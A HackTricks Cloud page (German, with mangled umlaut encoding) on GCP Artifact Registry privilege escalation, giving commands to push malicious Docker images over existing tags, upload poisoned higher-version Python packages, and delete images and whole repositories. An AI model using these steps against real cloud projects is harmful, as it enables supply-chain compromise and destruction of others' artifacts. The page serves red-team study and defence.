# GCP - Artifact Registry Privesc

{% hint style="success" %}
Lerne & √ºbe AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Lerne & √ºbe GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* √úberpr√ºfe die [**Abonnementpl√§ne**](https://github.com/sponsors/carlospolop)!
* **Tritt der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folge** uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teile Hacking-Tricks, indem du PRs zu den** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repos einreichst.

</details>
{% endhint %}

## Artifact Registry

F√ºr weitere Informationen √ºber Artifact Registry siehe:

{% content-ref url="../gcp-services/gcp-artifact-registry-enum.md" %}
[gcp-artifact-registry-enum.md](../gcp-services/gcp-artifact-registry-enum.md)
{% endcontent-ref %}

### artifactregistry.repositories.uploadArtifacts

Mit dieser Berechtigung k√∂nnte ein Angreifer neue Versionen der Artefakte mit sch√§dlichem Code wie Docker-Images hochladen:

{% code overflow="wrap" %}
```bash
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# tag the image to upload it
docker tag <local-img-name>:<local-tag> <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>

# Upload it
docker push <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
{% endcode %}

{% hint style="danger" %}
Es wurde √ºberpr√ºft, dass es **m√∂glich ist, ein neues b√∂sartiges Docker**-Image mit demselben Namen und Tag wie das bereits vorhandene hochzuladen, sodass das **alte den Tag verliert** und beim n√§chsten Mal, wenn dieses Image mit diesem Tag **heruntergeladen wird, das b√∂sartige** heruntergeladen wird.
{% endhint %}

<details>

<summary>Eine Python-Bibliothek hochladen</summary>

**Beginnen Sie mit der Erstellung der Bibliothek, die hochgeladen werden soll** (wenn Sie die neueste Version aus dem Repository herunterladen k√∂nnen, k√∂nnen Sie diesen Schritt √ºberspringen):

1.  **Richten Sie Ihre Projektstruktur ein**:

* Erstellen Sie ein neues Verzeichnis f√ºr Ihre Bibliothek, z. B. `hello_world_library`.
* Erstellen Sie in diesem Verzeichnis ein weiteres Verzeichnis mit Ihrem Paketnamen, z. B. `hello_world`.
* Erstellen Sie in Ihrem Paketverzeichnis eine `__init__.py`-Datei. Diese Datei kann leer sein oder Initialisierungen f√ºr Ihr Paket enthalten.

```bash
mkdir hello_world_library
cd hello_world_library
mkdir hello_world
touch hello_world/__init__.py
```
2.  **Schreiben Sie Ihren Bibliothekscode**:

* Erstellen Sie im Verzeichnis `hello_world` eine neue Python-Datei f√ºr Ihr Modul, z. B. `greet.py`.
* Schreiben Sie Ihre "Hallo, Welt!"-Funktion:

```python
# hello_world/greet.py
def say_hello():
return "Hello, World!"
```
3.  **Erstellen Sie eine `setup.py`-Datei**:

* Erstellen Sie im Stammverzeichnis Ihres `hello_world_library`-Verzeichnisses eine `setup.py`-Datei.
* Diese Datei enth√§lt Metadaten √ºber Ihre Bibliothek und sagt Python, wie es installiert werden soll.

```python
# setup.py
from setuptools import setup, find_packages

setup(
name='hello_world',
version='0.1',
packages=find_packages(),
install_requires=[
# Alle Abh√§ngigkeiten, die Ihre Bibliothek ben√∂tigt
],
)
```

**Jetzt lassen Sie uns die Bibliothek hochladen:**

1.  **Bauen Sie Ihr Paket**:

* F√ºhren Sie im Stammverzeichnis Ihres `hello_world_library`-Verzeichnisses Folgendes aus:

```sh
python3 setup.py sdist bdist_wheel
```
2. **Konfigurieren Sie die Authentifizierung f√ºr twine** (wird verwendet, um Ihr Paket hochzuladen):
* Stellen Sie sicher, dass Sie `twine` installiert haben (`pip install twine`).
* Verwenden Sie `gcloud`, um die Anmeldeinformationen zu konfigurieren:

{% code overflow="wrap" %}
````
```sh
twine upload --username 'oauth2accesstoken' --password "$(gcloud auth print-access-token)" --repository-url https://<location>-python.pkg.dev/<project-id>/<repo-name>/ dist/*
```
````
{% endcode %}

3. **Bereinigen Sie den Build**
```bash
rm -rf dist build hello_world.egg-info
```
</details>

{% hint style="danger" %}
Es ist nicht m√∂glich, eine Python-Bibliothek mit der gleichen Version wie die bereits vorhandene hochzuladen, aber es ist m√∂glich, **gr√∂√üere Versionen** hochzuladen (oder eine zus√§tzliche **`.0` am Ende** der Version hinzuzuf√ºgen, wenn das funktioniert - nicht in Python jedoch -), oder die **letzte Version zu l√∂schen und eine neue mit** (ben√∂tigtem `artifactregistry.versions.delete)`** hochzuladen:**

{% code overflow="wrap" %}
```sh
gcloud artifacts versions delete <version> --repository=<repo-name> --location=<location> --package=<lib-name>
```
{% endcode %}
{% endhint %}

### `artifactregistry.repositories.downloadArtifacts`

Mit dieser Berechtigung k√∂nnen Sie **Artefakte herunterladen** und nach **sensiblen Informationen** und **Schwachstellen** suchen.

Laden Sie ein **Docker**-Image herunter:
```sh
# Configure docker to use gcloud to authenticate with Artifact Registry
gcloud auth configure-docker <location>-docker.pkg.dev

# Dowload image
docker pull <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
Laden Sie eine **python**-Bibliothek herunter:

{% code overflow="wrap" %}
```bash
pip install <lib-name> --index-url "https://oauth2accesstoken:$(gcloud auth print-access-token)@<location>-python.pkg.dev/<project-id>/<repo-name>/simple/" --trusted-host <location>-python.pkg.dev --no-cache-dir
```
{% endcode %}

* Was passiert, wenn ein Remote- und ein Standard-Registry in einem virtuellen gemischt werden und ein Paket in beiden existiert? √úberpr√ºfen Sie diese Seite:

{% content-ref url="../gcp-persistence/gcp-artifact-registry-persistence.md" %}
[gcp-artifact-registry-persistence.md](../gcp-persistence/gcp-artifact-registry-persistence.md)
{% endcontent-ref %}

### `artifactregistry.tags.delete`, `artifactregistry.versions.delete`, `artifactregistry.packages.delete`, (`artifactregistry.repositories.get`, `artifactregistry.tags.get`, `artifactregistry.tags.list`)

L√∂schen Sie Artefakte aus dem Registry, wie Docker-Images:

{% code overflow="wrap" %}
```bash
# Delete a docker image
gcloud artifacts docker images delete <location>-docker.pkg.dev/<proj-name>/<repo-name>/<img-name>:<tag>
```
{% endcode %}

### `artifactregistry.repositories.delete`

L√∂schen Sie ein vollst√§ndiges Repository (auch wenn es Inhalte hat):

{% code overflow="wrap" %}
```
gcloud artifacts repositories delete <repo-name> --location=<location>
```
{% endcode %}

### `artifactregistry.repositories.setIamPolicy`

Ein Angreifer mit dieser Berechtigung k√∂nnte sich selbst Berechtigungen geben, um einige der zuvor genannten Repository-Angriffe durchzuf√ºhren.

### Pivoting zu anderen Diensten √ºber Artifact Registry Lesen & Schreiben

* **Cloud Functions**

Wenn eine Cloud-Funktion erstellt wird, wird ein neues Docker-Image in das Artifact Registry des Projekts hochgeladen. Ich habe versucht, das Image durch ein neues zu √§ndern und sogar das aktuelle Image (und das `cache`-Image) zu l√∂schen, und es hat sich nichts ge√§ndert, die Cloud-Funktion funktioniert weiterhin. Daher k√∂nnte es **m√∂glich sein, einen Race Condition-Angriff auszunutzen**, wie beim Bucket, um den Docker-Container zu √§ndern, der ausgef√ºhrt wird, aber **nur durch das √Ñndern des gespeicherten Images ist es nicht m√∂glich, die Cloud-Funktion zu kompromittieren**.

* **App Engine**

Obwohl App Engine Docker-Images im Artifact Registry erstellt, wurde getestet, dass **selbst wenn Sie das Image innerhalb dieses Dienstes √§ndern** und die App Engine-Instanz entfernen (sodass eine neue bereitgestellt wird), der **ausgef√ºhrte Code sich nicht √§ndert**.\
Es k√∂nnte m√∂glich sein, dass durch die Durchf√ºhrung eines **Race Condition-Angriffs wie bei den Buckets der ausgef√ºhrte Code √ºberschrieben werden k√∂nnte**, aber dies wurde nicht getestet.

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../../.gitbook/assets/image (1).png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../../.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
